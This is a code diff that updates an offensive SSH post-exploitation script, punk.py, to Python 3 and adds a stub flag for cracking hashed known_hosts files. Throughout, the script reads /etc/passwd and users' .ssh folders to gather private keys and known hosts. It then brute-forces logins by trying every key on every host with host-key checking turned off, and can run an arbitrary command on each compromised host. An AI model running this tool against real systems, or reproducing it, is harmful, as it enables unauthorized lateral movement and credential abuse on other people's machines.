@@ -27,8 +27,12 @@
 import os
 import sys
 import threading
-import Queue
 import argparse
+
+try: 
+    import queue as queue
+except ImportError:
+    import Queue as queue
 
 homesBlacklist = ["/dev/null","/var/empty","/bin","/sbin"]
 shellBlacklist = ["/sbin/nologin","/bin/false","/usr/sbin/nologin","/bin/sync"]
@@ -63,11 +67,11 @@ class WorkerThread(threading.Thread) :
 							self.credentials.put(user+":"+host+":"+key)
 
 							if user+":"+host+":"+key not in success:
-								print "\033[92m[*]\033[0m Got \033[92m%s@%s\033[0m with \033[92m\"%s\"\033[0m key." % (user,host,key)
+								sys.stdout.write ("\033[92m[*]\033[0m Got \033[92m%s@%s\033[0m with \033[92m\"%s\"\033[0m key.\n" % (user,host,key))
 								success.append(user+":"+host+":"+key)
 							
 							if CMD != '':
-								print "\033[92m[*]\033[0m Executing \033[92m%s\033[0m." % (CMD)
+								sys.stdout.write ("\033[92m[*]\033[0m Executing \033[92m%s\033[0m.\n" % (CMD))
 								os.system("ssh -oBatchMode=yes -oStrictHostKeyChecking=no -oPasswordAuthentication=no -oConnectTimeout=8 %s@%s -i %s -q -t \"%s\" " % (user,host,key,CMD))
 
 
@@ -110,10 +114,10 @@ class attack(object):
 		return out[0], out[1] # Output attack: user, host
 
 
-def discovery(passwd, home_path):
+def discovery(args):
 	# Search users, SSH keys and known hosts
 
-	if passwd:
+	if args.passwd:
 		# Get users and home paths from passwd
 		F = open("/etc/passwd",'r')
 
@@ -131,6 +135,8 @@ def discovery(passwd, home_path):
 					#collect known hosts
 					if os.path.isfile(home + "/.ssh/known_hosts"):
 						FK = open(home + "/.ssh/known_hosts")
+						encrypted_knownhosts = False
+
 						for host in FK:
 							if not host.find("|") >= 0: # secure known_hosts
 								if host.find(",") >= 0:
@@ -140,7 +146,17 @@ def discovery(passwd, home_path):
 								if hostname not in knownHosts:
 									knownHosts.append(hostname)
 							else:
-								print "\033[93m[!]\033[0m Encrypted known host at \033[93m%s" % home + "/.ssh/known_hosts\033[0m"
+								encrypted_knownhosts = True
+
+								if args.crack != "":
+									# crack the hashed known hosts
+									sys.stdout.write ("cracking..."+host)
+
+						if encrypted_knownhosts:
+							sys.stdout.write ("\033[93m[!]\033[0m Encrypted known host at \033[93m%s" % home + "/.ssh/known_hosts\033[0m\n")
+							sys.stdout.write ("\033[93m[!]\033[0m Run with \033[93m--crack\033[0m flag to break it\n")
+
+
 						FK.close()
 
 					# check users with private keys
@@ -151,18 +167,20 @@ def discovery(passwd, home_path):
 		F.close()
 
 	# home directory scan
-	for homes in os.listdir(home_path):
+	for homes in os.listdir(args.home):
 		if homes not in users:
 
 			users.append(homes)
 
-			if os.path.isfile(home_path+homes + "/.ssh/id_rsa"):
+			if os.path.isfile(args.home+homes + "/.ssh/id_rsa"):
 				#targets[homes] = homes + "/.ssh/id_rsa"
-				if home_path+homes + "/.ssh/id_rsa" not in sshKeys:
-					sshKeys.append(home_path+homes + "/.ssh/id_rsa")
+				if args.home+homes + "/.ssh/id_rsa" not in sshKeys:
+					sshKeys.append(args.home+homes + "/.ssh/id_rsa")
 
-			if os.path.isfile(home_path+homes + "/.ssh/known_hosts"):
-				FK = open(home_path+homes + "/.ssh/known_hosts")
+			if os.path.isfile(args.home+homes + "/.ssh/known_hosts"):
+				FK = open(args.home+homes + "/.ssh/known_hosts")
+				encrypted_knownhosts = False
+
 				for host in FK:
 					if not host.find("|") >= 0: # secure known_hosts
 						if host.find(",") >= 0:
@@ -172,14 +190,20 @@ def discovery(passwd, home_path):
 						if hostname not in knownHosts:
 							knownHosts.append(hostname)
 					else:
-						print "\033[93m[!]\033[0m Encrypted known host at \033[93m%s" % home_path + homes + "/.ssh/known_hosts\033[0m"
+						encrypted_knownhosts = True
+
+				if encrypted_knownhosts:
+						sys.stdout.write ("\033[93m[!]\033[0m Encrypted known host at \033[93m%s" % args.home + homes + "/.ssh/known_hosts\033[0m\n")
+						sys.stdout.write ("\033[93m[!]\033[0m Run with \033[93m%s--crack\033[0m flag to break it\n")
+
 				FK.close()
 	
 	return True
 
+
 if __name__ == "__main__":
 
-	print """\033[92m
+	sys.stdout.write ("""\033[92m
              |
          \   |   /
     .     \  |  /    .
@@ -189,53 +213,54 @@ if __name__ == "__main__":
      .-'`.  !!    -   \033[90m-=[ \033[93mpunk.py - unix SSH post-exploitation 1337 tool\033[92m
     '     `  !  __.'  \033[90m-=[ \033[93mby `r3vn` ( tw: @r3vnn )\033[92m
           _)___(      \033[90m-=[ \033[93mhttps://xfiltrated.com\033[92m
-        \n\033[0m"""
+        \n\033[0m""")
 
 
 	parser = argparse.ArgumentParser()
 	parser.add_argument('--home', help='custom home path',default="/home/")
 	parser.add_argument('--run', help='run commands on compromised hosts',default="")
 	parser.add_argument('--no-passwd', dest='passwd', action='store_false', default=True, help='skip passwd check')
+	parser.add_argument('--crack', help='crack hashed known_hosts files',default="",metavar='subnet')
 	args = parser.parse_args()
 
-	print "\033[92m[*]\033[0m enumerating valid users with ssh keys..."
-	discovery(args.passwd, args.home)
-	print "\033[92m[*]\033[0m Done."
+	sys.stdout.write ("\033[92m[*]\033[0m enumerating valid users with ssh keys...\n")
+	discovery(args)
+	sys.stdout.write ("\033[92m[*]\033[0m Done.\n")
 
 	if len(sshKeys) <= 0:
-		print "\033[93m[!]\033[0m No valid SSH keys found on the system."
+		sys.stdout.write ("\033[93m[!]\033[0m No valid SSH keys found on the system.\n")
 		sys.exit()
 	else:
-		print "\033[92m[*]\033[0m SSH keys found:\n\033[92m"
+		sys.stdout.write ("\033[92m[*]\033[0m SSH keys found:\n\033[92m\n")
 
 		for key in sshKeys:
-			print "\t" + key
+			sys.stdout.write ("\t" + key + "\n")
 
 	if len(users) <= 0:
-		print "\n\033[93m[!]\033[0m No valid users found on the system."
+		sys.stdout.write ("\n\033[93m[!]\033[0m No valid users found on the system.\n")
 		sys.exit()
 	else:
-		print "\n\033[92m[*]\033[0m Users found:\n\033[92m"
+		sys.stdout.write ("\n\033[92m[*]\033[0m Users found:\n\033[92m\n")
 
 		for user in users:
-			print "\t" + user #+ " :: " + targets[user]
+			sys.stdout.write ("\t" + user + "\n" )#+ " :: " + targets[user]
 
 	if len(knownHosts) <= 0:
-		print "\n\033[93m[!]\033[0m No valid known hosts found on the system."
+		sys.stdout.write ("\n\033[93m[!]\033[0m No valid known hosts found on the system.\n")
 		sys.exit()
 
 	else:
-		print "\n\033[92m[*]\033[0m known hosts found:\n\033[92m"
+		sys.stdout.write ("\n\033[92m[*]\033[0m known hosts found:\n\033[92m\n")
 
 		for host in knownHosts:
-			print "\t"+host
+			sys.stdout.write ("\t"+host)
 
-	print "\n\033[92m[*]\033[0m Starting keys bruteforcing..."
+	sys.stdout.write ("\n\033[92m[*]\033[0m Starting keys bruteforcing...\n")
 	CMD = args.run
 	Attack = attack()
 
 	Attack.run()
-	print "\033[92m[*]\033[0m Attack Complete!"
+	sys.stdout.write ("\033[92m[*]\033[0m Attack Complete!\n")
 
 
 
